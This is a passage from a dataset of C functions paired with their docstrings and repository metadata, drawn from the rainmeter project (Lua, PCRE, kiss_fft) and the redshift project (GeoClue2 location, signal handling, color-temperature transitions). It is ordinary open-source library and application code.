"rainmeter/Library/zlib/gzwrite.c", "commit_date": "2015-12-26 00:00:00", "repo_name": "rainmeter/rainmeter", "stars": 4260, "license": "gpl-2.0", "language": "c", "size": 15810}
{"docstring": "/*\n** Garbage-collection function\n*/\n", "func_signal": "LUA_API int lua_gc (lua_State *L, int what, int data)", "code": "{\n  int res = 0;\n  global_State *g;\n  lua_lock(L);\n  g = G(L);\n  switch (what) {\n    case LUA_GCSTOP: {\n      g->GCthreshold = MAX_LUMEM;\n      break;\n    }\n    case LUA_GCRESTART: {\n      g->GCthreshold = g->totalbytes;\n      break;\n    }\n    case LUA_GCCOLLECT: {\n      luaC_fullgc(L);\n      break;\n    }\n    case LUA_GCCOUNT: {\n      /* GC values are expressed in Kbytes: #bytes/2^10 */\n      res = cast_int(g->totalbytes >> 10);\n      break;\n    }\n    case LUA_GCCOUNTB: {\n      res = cast_int(g->totalbytes & 0x3ff);\n      break;\n    }\n    case LUA_GCSTEP: {\n      lu_mem a = (cast(lu_mem, data) << 10);\n      if (a <= g->totalbytes)\n        g->GCthreshold = g->totalbytes - a;\n      else\n        g->GCthreshold = 0;\n      while (g->GCthreshold <= g->totalbytes) {\n        luaC_step(L);\n        if (g->gcstate == GCSpause) {  /* end of cycle? */\n          res = 1;  /* signal it */\n          break;\n        }\n      }\n      break;\n    }\n    case LUA_GCSETPAUSE: {\n      res = g->gcpause;\n      g->gcpause = data;\n      break;\n    }\n    case LUA_GCSETSTEPMUL: {\n      res = g->gcstepmul;\n      g->gcstepmul = data;\n      break;\n    }\n    default: res = -1;  /* invalid option */\n  }\n  lua_unlock(L);\n  return res;\n}", "path": "rainmeter/Library/lua/lua/lapi.c", "commit_date": "2017-08-06 00:00:00", "repo_name": "rainmeter/rainmeter", "stars": 4260, "license": "gpl-2.0", "language": "c", "size": 15810}
{"docstring": "/*************************************************\n*  Print uchar string (regardless of utf)        *\n*************************************************/\n", "func_signal": "static void\nprint_puchar(FILE *f, PCRE_PUCHAR ptr)", "code": "{\nwhile (*ptr != '\\0')\n  {\n  register pcre_uint32 c = *ptr++;\n  if (PRINTABLE(c)) fprintf(f, \"%c\", c); else fprintf(f, \"\\\\x{%x}\", c);\n  }\n}", "path": "rainmeter/Library/pcre/pcre_printint.c", "commit_date": "2015-08-11 00:00:00", "repo_name": "rainmeter/rainmeter", "stars": 4260, "license": "gpl-2.0", "language": "c", "size": 15810}
{"docstring": "/*  facbuf is populated by p1,m1,p2,m2, ...\n    where \n    p[i] * m[i] = m[i-1]\n    m0 = n                  */\n", "func_signal": "static \nvoid kf_factor(int n,int * facbuf)", "code": "{\n    int p=4;\n    double floor_sqrt;\n    floor_sqrt = floor( sqrt((double)n) );\n\n    /*factor out powers of 4, powers of 2, then any remaining primes */\n    do {\n        while (n % p) {\n            switch (p) {\n                case 4: p = 2; break;\n                case 2: p = 3; break;\n                default: p += 2; break;\n            }\n            if (p > floor_sqrt)\n                p = n;          /* no more factors, skip to end */\n        }\n        n /= p;\n        *facbuf++ = p;\n        *facbuf++ = n;\n    } while (n > 1);\n}", "path": "rainmeter/Plugins/PluginAudioLevel/kiss_fft130/kiss_fft.c", "commit_date": "2014-09-09 00:00:00", "repo_name": "rainmeter/rainmeter", "stars": 4260, "license": "gpl-2.0", "language": "c", "size": 15810}
{"docstring": "/*************************************************\n*          Find Unicode property name            *\n*************************************************/\n", "func_signal": "static const char *\nget_ucpname(unsigned int ptype, unsigned int pvalue)", "code": "{\n#ifdef SUPPORT_UCP\nint i;\nfor (i = PRIV(utt_size) - 1; i >= 0; i--)\n  {\n  if (ptype == PRIV(utt)[i].type && pvalue == PRIV(utt)[i].value) break;\n  }\nreturn (i >= 0)? PRIV(utt_names) + PRIV(utt)[i].name_offset : \"??\";\n#else\n/* It gets harder and harder to shut off unwanted compiler warnings. */\nptype = ptype * pvalue;\nreturn (ptype == pvalue)? \"??\" : \"??\";\n#endif\n}", "path": "rainmeter/Library/pcre/pcre_printint.c", "commit_date": "2015-08-11 00:00:00", "repo_name": "rainmeter/rainmeter", "stars": 4260, "license": "gpl-2.0", "language": "c", "size": 15810}
{"docstring": "/*\n** set functions (stack -> Lua)\n*/\n", "func_signal": "LUA_API void lua_settable (lua_State *L, int idx)", "code": "{\n  StkId t;\n  lua_lock(L);\n  api_checknelems(L, 2);\n  t = index2adr(L, idx);\n  api_checkvalidindex(L, t);\n  luaV_settable(L, t, L->top - 2, L->top - 1);\n  L->top -= 2;  /* pop index and value */\n  lua_unlock(L);\n}", "path": "rainmeter/Library/lua/lua/lapi.c", "commit_date": "2017-08-06 00:00:00", "repo_name": "rainmeter/rainmeter", "stars": 4260, "license": "gpl-2.0", "language": "c", "size": 15810}
{"docstring": "/* perform the butterfly for one stage of a mixed radix FFT */\n", "func_signal": "static void kf_bfly_generic(\n        kiss_fft_cpx * Fout,\n        const size_t fstride,\n        const kiss_fft_cfg st,\n        int m,\n        int p\n        )", "code": "{\n    int u,k,q1,q;\n    kiss_fft_cpx * twiddles = st->twiddles;\n    kiss_fft_cpx t;\n    int Norig = st->nfft;\n\n    kiss_fft_cpx * scratch = (kiss_fft_cpx*)KISS_FFT_TMP_ALLOC(sizeof(kiss_fft_cpx)*p);\n\n    for ( u=0; u<m; ++u ) {\n        k=u;\n        for ( q1=0 ; q1<p ; ++q1 ) {\n            scratch[q1] = Fout[ k  ];\n            C_FIXDIV(scratch[q1],p);\n            k += m;\n        }\n\n        k=u;\n        for ( q1=0 ; q1<p ; ++q1 ) {\n            int twidx=0;\n            Fout[ k ] = scratch[0];\n            for (q=1;q<p;++q ) {\n                twidx += (int)(fstride * k);\n                if (twidx>=Norig) twidx-=Norig;\n                C_MUL(t,scratch[q] , twiddles[twidx] );\n                C_ADDTO( Fout[ k ] ,t);\n            }\n            k += m;\n        }\n    }\n    KISS_FFT_TMP_FREE(scratch);\n}", "path": "rainmeter/Plugins/PluginAudioLevel/kiss_fft130/kiss_fft.c", "commit_date": "2014-09-09 00:00:00", "repo_name": "rainmeter/rainmeter", "stars": 4260, "license": "gpl-2.0", "language": "c", "size": 15810}
{"docstring": "/*\n** access functions (stack -> C)\n*/\n", "func_signal": "LUA_API int lua_type (lua_State *L, int idx)", "code": "{\n  StkId o = index2adr(L, idx);\n  return (o == luaO_nilobject) ? LUA_TNONE : ttype(o);\n}", "path": "rainmeter/Library/lua/lua/lapi.c", "commit_date": "2017-08-06 00:00:00", "repo_name": "rainmeter/rainmeter", "stars": 4260, "license": "gpl-2.0", "language": "c", "size": 15810}
{"docstring": "/* Character string printing function for debugging.\n\nArguments:\n  p            points to string\n  length       number of bytes\n  f            where to print\n\nReturns:       nothing\n*/\n", "func_signal": "static void\npchars(const pcre_uchar *p, int length, FILE *f)", "code": "{\npcre_uint32 c;\nwhile (length-- > 0)\n  {\n  if (isprint(c = *(p++)))\n    fprintf(f, \"%c\", c);\n  else\n    fprintf(f, \"\\\\x{%02x}\", c);\n  }\n}", "path": "rainmeter/Library/pcre/pcre_dfa_exec.c", "commit_date": "2015-08-11 00:00:00", "repo_name": "rainmeter/rainmeter", "stars": 4260, "license": "gpl-2.0", "language": "c", "size": 15810}
{"docstring": "/* Given a character, set its first byte's bit in the table, and also the\ncorresponding bit for the other version of a letter if we are caseless. In\nUTF-8 mode, for characters greater than 127, we can only do the caseless thing\nwhen Unicode property support is available.\n\nArguments:\n  start_bits    points to the bit map\n  p             points to the character\n  caseless      the caseless flag\n  cd            the block with char table pointers\n  utf           TRUE for UTF-8 / UTF-16 / UTF-32 mode\n\nReturns:        pointer after the character\n*/\n", "func_signal": "static const pcre_uchar *\nset_table_bit(pcre_uint8 *start_bits, const pcre_uchar *p, BOOL caseless,\n  compile_data *cd, BOOL utf)", "code": "{\npcre_uint32 c = *p;\n\n#ifdef COMPILE_PCRE8\nSET_BIT(c);\n\n#ifdef SUPPORT_UTF\nif (utf && c > 127)\n  {\n  GETCHARINC(c, p);\n#ifdef SUPPORT_UCP\n  if (caseless)\n    {\n    pcre_uchar buff[6];\n    c = UCD_OTHERCASE(c);\n    (void)PRIV(ord2utf)(c, buff);\n    SET_BIT(buff[0]);\n    }\n#endif  /* Not SUPPORT_UCP */\n  return p;\n  }\n#else   /* Not SUPPORT_UTF */\n(void)(utf);   /* Stops warning for unused parameter */\n#endif  /* SUPPORT_UTF */\n\n/* Not UTF-8 mode, or character is less than 127. */\n\nif (caseless && (cd->ctypes[c] & ctype_letter) != 0) SET_BIT(cd->fcc[c]);\nreturn p + 1;\n#endif  /* COMPILE_PCRE8 */\n\n#if defined COMPILE_PCRE16 || defined COMPILE_PCRE32\nif (c > 0xff)\n  {\n  c = 0xff;\n  caseless = FALSE;\n  }\nSET_BIT(c);\n\n#ifdef SUPPORT_UTF\nif (utf && c > 127)\n  {\n  GETCHARINC(c, p);\n#ifdef SUPPORT_UCP\n  if (caseless)\n    {\n    c = UCD_OTHERCASE(c);\n    if (c > 0xff)\n      c = 0xff;\n    SET_BIT(c);\n    }\n#endif  /* SUPPORT_UCP */\n  return p;\n  }\n#else   /* Not SUPPORT_UTF */\n(void)(utf);   /* Stops warning for unused parameter */\n#endif  /* SUPPORT_UTF */\n\nif (caseless && (cd->ctypes[c] & ctype_letter) != 0) SET_BIT(cd->fcc[c]);\nreturn p + 1;\n#endif\n}", "path": "rainmeter/Library/pcre/pcre_study.c", "commit_date": "2015-08-11 00:00:00", "repo_name": "rainmeter/rainmeter", "stars": 4260, "license": "gpl-2.0", "language": "c", "size": 15810}
{"docstring": "/* This function sets starting bits for a character type. In UTF-8 mode, we can\nonly do a direct setting for bytes less than 128, as otherwise there can be\nconfusion with bytes in the middle of UTF-8 characters. In a \"traditional\"\nenvironment, the tables will only recognize ASCII characters anyway, but in at\nleast one Windows environment, some higher bytes bits were set in the tables.\nSo we deal with that case by considering the UTF-8 encoding.\n\nArguments:\n  start_bits     the starting bitmap\n  cbit type      the type of character wanted\n  table_limit    32 for non-UTF-8; 16 for UTF-8\n  cd             the block with char table pointers\n\nReturns:         nothing\n*/\n", "func_signal": "static void\nset_type_bits(pcre_uint8 *start_bits, int cbit_type, unsigned int table_limit,\n  compile_data *cd)", "code": "{\nregister pcre_uint32 c;\nfor (c = 0; c < table_limit; c++) start_bits[c] |= cd->cbits[c+cbit_type];\n#if defined SUPPORT_UTF && defined COMPILE_PCRE8\nif (table_limit == 32) return;\nfor (c = 128; c < 256; c++)\n  {\n  if ((cd->cbits[c/8] & (1 << (c&7))) != 0)\n    {\n    pcre_uchar buff[6];\n    (void)PRIV(ord2utf)(c, buff);\n    SET_BIT(buff[0]);\n    }\n  }\n#endif\n}", "path": "rainmeter/Library/pcre/pcre_study.c", "commit_date": "2015-08-11 00:00:00", "repo_name": "rainmeter/rainmeter", "stars": 4260, "license": "gpl-2.0", "language": "c", "size": 15810}
{"docstring": "/* Handle position change callbacks */\n", "func_signal": "static void\ngeoclue_client_signal_cb(GDBusProxy *client, gchar *sender_name,\n\t\t\t gchar *signal_name, GVariant *parameters,\n\t\t\t gpointer user_data)", "code": "{\n\tlocation_geoclue2_state_t *state = user_data;\n\n\t/* Only handle LocationUpdated signals */\n\tif (g_strcmp0(signal_name, \"LocationUpdated\") != 0) {\n\t\treturn;\n\t}\n\n\t/* Obtain location path */\n\tconst gchar *location_path;\n\tg_variant_get_child(parameters, 1, \"&o\", &location_path);\n\n\t/* Obtain location */\n\tGError *error = NULL;\n\tGDBusProxy *location = g_dbus_proxy_new_sync(\n\t\tg_dbus_proxy_get_connection(client),\n\t\tG_DBUS_PROXY_FLAGS_NONE,\n\t\tNULL,\n\t\t\"org.freedesktop.GeoClue2\",\n\t\tlocation_path,\n\t\t\"org.freedesktop.GeoClue2.Location\",\n\t\tNULL, &error);\n\tif (location == NULL) {\n\t\tg_printerr(_(\"Unable to obtain location: %s.\\n\"),\n\t\t\t   error->message);\n\t\tg_error_free(error);\n\t\tmark_error(state);\n\t\treturn;\n\t}\n\n\tg_mutex_lock(&state->lock);\n\n\t/* Read location properties */\n\tGVariant *lat_v = g_dbus_proxy_get_cached_property(\n\t\tlocation, \"Latitude\");\n\tstate->latitude = g_variant_get_double(lat_v);\n\n\tGVariant *lon_v = g_dbus_proxy_get_cached_property(\n\t\tlocation, \"Longitude\");\n\tstate->longitude = g_variant_get_double(lon_v);\n\n\tstate->available = 1;\n\n\tg_mutex_unlock(&state->lock);\n\n\tpipeutils_signal(state->pipe_fd_write);\n}", "path": "redshift/src/location-geoclue2.c", "commit_date": "2018-08-29 00:00:00", "repo_name": "jonls/redshift", "stars": 5757, "license": "gpl-3.0", "language": "c", "size": 2145}
{"docstring": "/* Interpolate color setting structs transition scheme. */\n", "func_signal": "static void\ninterpolate_transition_scheme(\n\tconst transition_scheme_t *transition,\n\tdouble alpha,\n\tcolor_setting_t *result)", "code": "{\n\tconst color_setting_t *day = &transition->day;\n\tconst color_setting_t *night = &transition->night;\n\n\talpha = CLAMP(0.0, alpha, 1.0);\n\tinterpolate_color_settings(night, day, alpha, result);\n}", "path": "redshift/src/redshift.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "jonls/redshift", "stars": 5757, "license": "gpl-3.0", "language": "c", "size": 2145}
{"docstring": "/* ! HAVE_SIGNAL_H || __WIN32__ */\n", "func_signal": "int\nsignals_install_handlers(void)", "code": "{\n#if defined(HAVE_SIGNAL_H) && !defined(__WIN32__)\n\tstruct sigaction sigact;\n\tsigset_t sigset;\n\tint r;\n\tsigemptyset(&sigset);\n\n\t/* Install signal handler for INT and TERM signals */\n\tsigact.sa_handler = sigexit;\n\tsigact.sa_mask = sigset;\n\tsigact.sa_flags = 0;\n\n\tr = sigaction(SIGINT, &sigact, NULL);\n\tif (r < 0) {\n\t\tperror(\"sigaction\");\n\t\treturn -1;\n\t}\n\n\tr = sigaction(SIGTERM, &sigact, NULL);\n\tif (r < 0) {\n\t\tperror(\"sigaction\");\n\t\treturn -1;\n\t}\n\n\t/* Install signal handler for USR1 signal */\n\tsigact.sa_handler = sigdisable;\n\tsigact.sa_mask = sigset;\n\tsigact.sa_flags = 0;\n\n\tr = sigaction(SIGUSR1, &sigact, NULL);\n\tif (r < 0) {\n\t\tperror(\"sigaction\");\n\t\treturn -1;\n\t}\n\n\t/* Ignore CHLD signal. This causes child processes\n\t   (hooks) to be reaped automatically. */\n\tsigact.sa_handler = SIG_IGN;\n\tsigact.sa_mask = sigset;\n\tsigact.sa_flags = 0;\n\n\tr = sigaction(SIGCHLD, &sigact, NULL);\n\tif (r < 0) {\n\t\tperror(\"sigaction\");\n\t\treturn -1;\n\t}\n#endif /* HAVE_SIGNAL_H && ! __WIN32__ */\n\n\treturn 0;\n}", "path": "redshift/src/signals.c", "commit_date": "2016-10-19 00:00:00", "repo_name": "jonls/redshift", "stars": 5757, "license": "gpl-3.0", "language": "c", "size": 2145}
{"docstring": "/* Return number of seconds since midnight from timestamp. */\n", "func_signal": "static int\nget_seconds_since_midnight(double timestamp)", "code": "{\n\ttime_t t = (time_t)timestamp;\n\tstruct tm tm;\n#ifdef _WIN32\n\tlocaltime_s(&tm, &t);\n#else\n\tlocaltime_r(&t, &tm);\n#endif\n\treturn tm.tm_sec + tm.tm_min * 60 + tm.tm_hour * 3600;\n}", "path": "redshift/src/redshift.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "jonls/redshift", "stars": 5757, "license": "gpl-3.0", "language": "c", "size": 2145}
{"docstring": "/* Reset color setting to default values. */\n", "func_signal": "static void\ncolor_setting_reset(color_setting_t *color)", "code": "{\n\tcolor->temperature = NEUTRAL_TEMP;\n\tcolor->gamma[0] = 1.0;\n\tcolor->gamma[1] = 1.0;\n\tcolor->gamma[2] = 1.0;\n\tcolor->brightness = 1.0;\n}", "path": "redshift/src/redshift.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "jonls/redshift", "stars": 5757, "license": "gpl-3.0", "language": "c", "size": 2145}
{"docstring": "/* Sleep for a number of milliseconds. */\n", "func_signal": "void\nsystemtime_msleep(unsigned int msecs)", "code": "{\n#ifndef _WIN32\n\tstruct timespec sleep;\n\tsleep.tv_sec = msecs / 1000;\n\tsleep.tv_nsec = (msecs % 1000)*1000000;\n\tnanosleep(&sleep, NULL);\n#else\n\tSleep(msecs);\n#endif\n}", "path": "redshift/src/systemtime.c", "commit_date": "2015-02-22 00:00:00", "repo_name": "jonls/redshift", "stars": 5757, "license": "gpl-3.0", "language": "c", "size": 2145}
{"docstring": "/* Determine how far through the transition we are based on elevation. */\n", "func_signal": "static double\nget_transition_progress_from_elevation(\n\tconst transition_scheme_t *transition, double elevation)", "code": "{\n\tif (elevation < transition->low) {\n\t\treturn 0.0;\n\t} else if (elevation < transition->high) {\n\t\treturn (transition->low - elevation) /\n\t\t\t(transition->low - transition->high);\n\t} else {\n\t\treturn 1.0;\n\t}\n}", "path": "redshift/src/redshift.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "jonls/redshift", "stars": 5757, "license": "gpl-3.0", "language": "c", "size": 2145}
{"docstring": "/* Callback when GeoClue name appears on the bus */\n", "func_signal": "static void\non_name_appeared(GDBusConnection *conn, const gchar *name,\n\t\t const gchar *name_owner, gpointer user_data)", "code": "{\n\tlocation_geoclue2_state_t *state = user_data;\n\n\t/* Obtain GeoClue Manager */\n\tGError *error = NULL;\n\tGDBusProxy *geoclue_manager = g_dbus_proxy_new_sync(\n\t\tconn,\n\t\tG_DBUS_PROXY_FLAGS_NONE,\n\t\tNULL,\n\t\t\"org.freedesktop.GeoClue2\",\n\t\t\"/org/freedesktop/GeoClue2/Manager\",\n\t\t\"org.freedesktop.GeoClue2.Manager\",\n\t\tNULL, &error);\n\tif (geoclue_manager == NULL) {\n\t\tg_printerr(_(\"Unable to obtain GeoClue Manager: %s.\\n\"),\n\t\t\t   error->message);\n\t\tg_error_free(error);\n\t\tmark_error(state);\n\t\treturn;\n\t}\n\n\t/* Obtain GeoClue Client path */\n\terror = NULL;\n\tGVariant *client_path_v =\n\t\tg_dbus_proxy_call_sync(geoclue_manager,\n\t\t\t\t       \"GetClient\",\n\t\t\t\t       NULL,\n\t\t\t\t       G_DBUS_CALL_FLAGS_NONE,\n\t\t\t\t       -1, NULL, &error);\n\tif (client_path_v == NULL) {\n\t\tg_printerr(_(\"Unable to obtain GeoClue client path: %s.\\n\"),\n\t\t\t   error->message);\n\t\tg_error_free(error);\n\t\tg_object_unref(geoclue_manager);\n\t\tmark_error(state);\n\t\treturn;\n\t}\n\n\tconst gchar *client_path;\n\tg_variant_get(client_path_v, \"(&o)\", &client_path);\n\n\t/* Obtain GeoClue client */\n\terror = NULL;\n\tGDBusProxy *geoclue_client = g_dbus_proxy_new_sync(\n\t\tconn,\n\t\tG_DBUS_PROXY_FLAGS_NONE,\n\t\tNULL,\n\t\t\"org.freedesktop.GeoClue2\",\n\t\tclient_path,\n\t\t\"org.freedesktop.GeoClue2.Client\",\n\t\tNULL, &error);\n\tif (geoclue_client == NULL) {\n\t\tg_printerr(_(\"Unable to obtain GeoClue Client: %s.\\n\"),\n\t\t\t   error->message);\n\t\tg_error_free(error);\n\t\tg_variant_unref(client_path_v);\n\t\tg_object_unref(geoclue_manager);\n\t\tmark_error(state);\n\t\treturn;\n\t}\n\n\tg_variant_unref(client_path_v);\n\n\t/* Set desktop id (basename of the .desktop file) */\n\terror = NULL;\n\tGVariant *ret_v = g_dbus_proxy_call_sync(\n\t\tgeoclue_client,\n\t\t\"org.freedesktop.DBus.Properties.Set\",\n\t\tg_variant_new(\"(ssv)\",\n\t\t\"org.freedesktop.GeoClue2.Client\",\n\t\t\"DesktopId\",\n\t\tg_variant_new(\"s\", \"redshift\")),\n\t\tG_DBUS_CALL_FLAGS_NONE,\n\t\t-1, NULL, &error);\n\tif (ret_v == NULL) {\n\t\t/* Ignore this error for now. The property is not available\n\t\t   in early versions of GeoClue2. */\n\t} else {\n\t\tg_variant_unref(ret_v);\n\t}\n\n\t/* Set distance threshold */\n\terror = NULL;\n\tret_v = g_dbus_proxy_call_sync(\n\t\tgeoclue_client,\n\t\t\"org.freedesktop.DBus.Properties.Set\",\n\t\tg_variant_new(\"(ssv)\",\n\t\t\"org.freedesktop.GeoClue2.Client\",\n\t\t\"DistanceThreshold\",\n\t\tg_variant_new(\"u\", 50000)),\n\t\tG_DBUS_CALL_FLAGS_NONE,\n\t\t-1, NULL, &error);\n\tif (ret_v == NULL) {\n\t\tg_printerr(_(\"Unable to set distance threshold: %s.\\n\"),\n\t\t\t   error->message);\n\t\tg_error_free(error);\n\t\tg_object_unref(geoclue_client);\n\t\tg_object_unref(geoclue_manager);\n\t\tmark_error(state);\n\t\treturn;\n\t}\n\n\tg_variant_unref(ret_v);\n\n\t/* Attach signal callback to client */\n\tg_signal_connect(geoclue_client, \"g-signal\",\n\t\t\t G_CALLBACK(geoclue_client_signal_cb),\n\t\t\t user_data);\n\n\t/* Start GeoClue client */\n\terror = NULL;\n\tret_v = g_dbus_proxy_call_sync(geoclue_client,\n\t\t\t\t       \"Start\",\n\t\t\t\t       NULL,\n\t\t\t\t       G_DBUS_CALL_FLAGS_NONE,\n\t\t\t\t       -1, NULL, &error);\n\tif (ret_v == NULL) {\n\t\tg_printerr(_(\"Unable to start GeoClue client: %s.\\n\"),\n\t\t\t   error->message);\n\t\tif (g_dbus_error_is_remote_error(error)) {\n\t\t\tgchar *dbus_error = g_dbus_error_get_remote_error(\n\t\t\t\terror);\n\t\t\tif (g_strcmp0(dbus_error, DBUS_ACCESS_ERROR) == 0) {\n\t\t\t\tprint_denial_message();\n\t\t\t}\n\t\t\tg_free(dbus_error);\n\t\t}\n\t\tg_error_free(error);\n\t\tg_object_unref(geoclue_client);\n\t\tg_object_unref(geoclue_manager);\n\t\tmark_error(state);\n\t\treturn;\n\t}\n\n\tg_variant_unref(ret_v);\n}", "path": "redshift/src/location-geoclue2.c", "commit_date": "2018-08-29 00:00:00", "repo_name": "jonls/redshift", "stars": 5757, "license": "gpl-3.0", "language": "c", "size": 2145}
{"docstring": "/* Run continual mode loop\n   This is the main loop of the continual mode which keeps track of the\n   current time and continuously updates the screen to the appropriate\n   color temperature. */\n", "func_signal": "static int\nrun_continual_mode(const location_provider_t *provider,\n\t\t   location_state_t *location_state,\n\t\t   const transition_scheme_t *scheme,\n\t\t   const gamma_method_t *method,\n\t\t   gamma_state_t *method_state,\n\t\t   int use_fade, int preserve_gamma, int verbose)", "code": "{\n\tint r;\n\n\t/* Short fade parameters */\n\tint fade_length = 0;\n\tint fade_time = 0;\n\tcolor_setting_t fade_start_interp;\n\n\tr = signals_install_handlers();\n\tif (r < 0) {\n\t\treturn r;\n\t}\n\n\t/* Save previous parameters so we can avoid printing status updates if\n\t   the values did not change. */\n\tperiod_t prev_period = PERIOD_NONE;\n\n\t/* Previous target color setting and current actual color setting.\n\t   Actual color setting takes into account the current color fade. */\n\tcolor_setting_t prev_target_interp;\n\tcolor_setting_reset(&prev_target_interp);\n\n\tcolor_setting_t interp;\n\tcolor_setting_reset(&interp);\n\n\tlocation_t loc = { NAN, NAN };\n\tint need_location = !scheme->use_time;\n\tif (need_location) {\n\t\tfputs(_(\"Waiting for initial location\"\n\t\t\t\" to become available...\\n\"), stderr);\n\n\t\t/* Get initial location from provider */\n\t\tr = provider_get_location(provider, location_state, -1, &loc);\n\t\tif (r < 0) {\n\t\t\tfputs(_(\"Unable to get location\"\n\t\t\t\t\" from provider.\\n\"), stderr);\n\t\t\treturn -1;\n\t\t}\n\n\t\tif (!location_is_valid(&loc)) {\n\t\t\tfputs(_(\"Invalid location returned from provider.\\n\"),\n\t\t\t      stderr);\n\t\t\treturn -1;\n\t\t}\n\n\t\tprint_location(&loc);\n\t}\n\n\tif (verbose) {\n\t\tprintf(_(\"Color temperature: %uK\\n\"), interp.temperature);\n\t\tprintf(_(\"Brightness: %.2f\\n\"), interp.brightness);\n\t}\n\n\t/* Continuously adjust color temperature */\n\tint done = 0;\n\tint prev_disabled = 1;\n\tint disabled = 0;\n\tint location_available = 1;\n\twhile (1) {\n\t\t/* Check to see if disable signal was caught */\n\t\tif (disable && !done) {\n\t\t\tdisabled = !disabled;\n\t\t\tdisable = 0;\n\t\t}\n\n\t\t/* Check to see if exit signal was caught */\n\t\tif (exiting) {\n\t\t\tif (done) {\n\t\t\t\t/* On second signal stop the ongoing fade. */\n\t\t\t\tbreak;\n\t\t\t} else {\n\t\t\t\tdone = 1;\n\t\t\t\tdisabled = 1;\n\t\t\t}\n\t\t\texiting = 0;\n\t\t}\n\n\t\t/* Print status change */\n\t\tif (verbose && disabled != prev_disabled) {\n\t\t\tprintf(_(\"Status: %s\\n\"), disabled ?\n\t\t\t       _(\"Disabled\") : _(\"Enabled\"));\n\t\t}\n\n\t\tprev_disabled = disabled;\n\n\t\t/* Read timestamp */\n\t\tdouble now;\n\t\tr = systemtime_get_time(&now);\n\t\tif (r < 0) {\n\t\t\tfputs(_(\"Unable to read system time.\\n\"), stderr);\n\t\t\treturn -1;\n\t\t}\n\n\t\tperiod_t period;\n\t\tdouble transition_prog;\n\t\tif (scheme->use_time) {\n\t\t\tint time_offset = get_seconds_since_midnight(now);\n\n\t\t\tperiod = get_period_from_time(scheme, time_offset);\n\t\t\ttransition_prog = get_transition_progress_from_time(\n\t\t\t\tscheme, time_offset);\n\t\t} else {\n\t\t\t/* Current angular elevation of the sun */\n\t\t\tdouble elevation = solar_elevation(\n\t\t\t\tnow, loc.lat, loc.lon);\n\n\t\t\tperiod = get_period_from_elevation(scheme, elevation);\n\t\t\ttransition_prog =\n\t\t\t\tget_transition_progress_from_elevation(\n\t\t\t\t\tscheme, elevation);\n\t\t}\n\n\t\t/* Use transition progress to get target color\n\t\t   temperature. */\n\t\tcolor_setting_t target_interp;\n\t\tinterpolate_transition_scheme(\n\t\t\tscheme, transition_prog, &target_interp);\n\n\t\tif (disabled) {\n\t\t\tperiod = PERIOD_NONE;\n\t\t\tcolor_setting_reset(&target_interp);\n\t\t}\n\n\t\tif (done) {\n\t\t\tperiod = PERIOD_NONE;\n\t\t}\n\n\t\t/* Print period if it changed during this update,\n\t\t   or if we are in the transition period. In transition we\n\t\t   print the progress, so we always print it in\n\t\t   that case. */\n\t\tif (verbose && (period != prev_period ||\n\t\t\t\tperiod == PERIOD_TRANSITION)) {\n\t\t\tprint_period(period, transition_prog);\n\t\t}\n\n\t\t/* Activate hooks if period changed */\n\t\tif (period != prev_period) {\n\t\t\thooks_signal_period_change(prev_period, period);\n\t\t}\n\n\t\t/* Start fade if the parameter differences are too big to apply\n\t\t   instantly. */\n\t\tif (use_fade) {\n\t\t\tif ((fade_length == 0 &&\n\t\t\t     color_setting_diff_is_major(\n\t\t\t\t     &interp,\n\t\t\t\t     &target_interp)) ||\n\t\t\t    (fade_length != 0 &&\n\t\t\t     color_setting_diff_is_major(\n\t\t\t\t     &target_interp,\n\t\t\t\t     &prev_target_interp))) {\n\t\t\t\tfade_length = FADE_LENGTH;\n\t\t\t\tfade_time = 0;\n\t\t\t\tfade_start_interp = interp;\n\t\t\t}\n\t\t}\n\n\t\t/* Handle ongoing fade */\n\t\tif (fade_length != 0) {\n\t\t\tfade_time += 1;\n\t\t\tdouble frac = fade_time / (double)fade_length;\n\t\t\tdouble alpha = CLAMP(0.0, ease_fade(frac), 1.0);\n\n\t\t\tinterpolate_color_settings(\n\t\t\t\t&fade_start_interp, &target_interp, alpha,\n\t\t\t\t&interp);\n\n\t\t\tif (fade_time > fade_length) {\n\t\t\t\tfade_time = 0;\n\t\t\t\tfade_length = 0;\n\t\t\t}\n\t\t} else {\n\t\t\tinterp = target_interp;\n\t\t}\n\n\t\t/* Break loop when done and final fade is over */\n\t\tif (done && fade_length == 0) break;\n\n\t\tif (verbose) {\n\t\t\tif (prev_target_interp.temperature !=\n\t\t\t    target_interp.temperature) {\n\t\t\t\tprintf(_(\"Color temperature: %uK\\n\"),\n\t\t\t\t       target_interp.temperature);\n\t\t\t}\n\t\t\tif (prev_target_interp.brightness !=\n\t\t\t    target_interp.brightness) {\n\t\t\t\tprintf(_(\"Brightness: %.2f\\n\"),\n\t\t\t\t       target_interp.brightness);\n\t\t\t}\n\t\t}\n\n\t\t/* Adjust temperature */\n\t\tr = method->set_temperature(\n\t\t\tmethod_state, &interp, preserve_gamma);\n\t\tif (r < 0) {\n\t\t\tfputs(_(\"Temperature adjustment failed.\\n\"),\n\t\t\t      stderr);\n\t\t\treturn -1;\n\t\t}\n\n\t\t/* Save period and target color setting as previous */\n\t\tprev_period = period;\n\t\tprev_target_interp = target_interp;\n\n\t\t/* Sleep length depends on whether a fade is ongoing. */\n\t\tint delay = SLEEP_DURATION;\n\t\tif (fade_length != 0) {\n\t\t\tdelay = SLEEP_DURATION_SHORT;\n\t\t}\n\n\t\t/* Update location. */\n\t\tint loc_fd = -1;\n\t\tif (need_location) {\n\t\t\tloc_fd = provider->get_fd(location_state);\n\t\t}\n\n\t\tif (loc_fd >= 0) {\n\t\t\t/* Provider is dynamic. */\n\t\t\tstruct pollfd pollfds[1];\n\t\t\tpollfds[0].fd = loc_fd;\n\t\t\tpollfds[0].events = POLLIN;\n\t\t\tint r = poll(pollfds, 1, delay);\n\t\t\tif (r < 0) {\n\t\t\t\tif (errno == EINTR) continue;\n\t\t\t\tperror(\"poll\");\n\t\t\t\tfputs(_(\"Unable to get location\"\n\t\t\t\t\t\" from provider.\\n\"), stderr);\n\t\t\t\treturn -1;\n\t\t\t} else if (r == 0) {\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\t/* Get new location and availability\n\t\t\t   information. */\n\t\t\tlocation_t new_loc;\n\t\t\tint new_available;\n\t\t\tr = provider->handle(\n\t\t\t\tlocation_state, &new_loc,\n\t\t\t\t&new_available);\n\t\t\tif (r < 0) 